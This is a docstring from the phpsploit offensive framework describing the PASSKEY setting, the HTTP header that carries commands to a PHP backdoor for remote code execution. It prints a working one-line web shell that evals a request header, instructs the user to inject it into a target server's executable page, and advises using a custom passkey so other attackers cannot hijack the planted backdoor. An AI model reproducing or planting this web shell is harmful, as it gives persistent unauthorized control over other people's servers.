"""
HTTP Header to use as main phpsploit payload stager for RCE.

PASSKEY is used by BACKDOOR setting, and phpsploit's http
tunnel mechanisms as the main payload stager & dispatcher.

While exploiting a remote TARGET with phpsploit, make sure
PASSKEY have the same value as the one it had when backdoor
had been generated.

* AUTHENTICATION FEATURE:
It is recommended that you permanently change PASSKEY value
to a custom value for authentication purposes.
Indeed, having a custom PASSKEY value ensures that other
phpsploit users will not be able to connect to your installed
backdoor without the knowledge of it's value.

* EXAMPLE: Use a custom PASSKEY to prevent unauthorized access
> set PASSKEY Custom123
> exploit
# [*] Current backdoor is: <?php @eval($_SERVER['HTTP_CUSTOM123']); ?>
# To run a remote tunnel, the backdoor shown above must be
# manually injected in a remote server executable web page.
# Then, use `set TARGET <BACKDOORED_URL>` and run `exploit`.
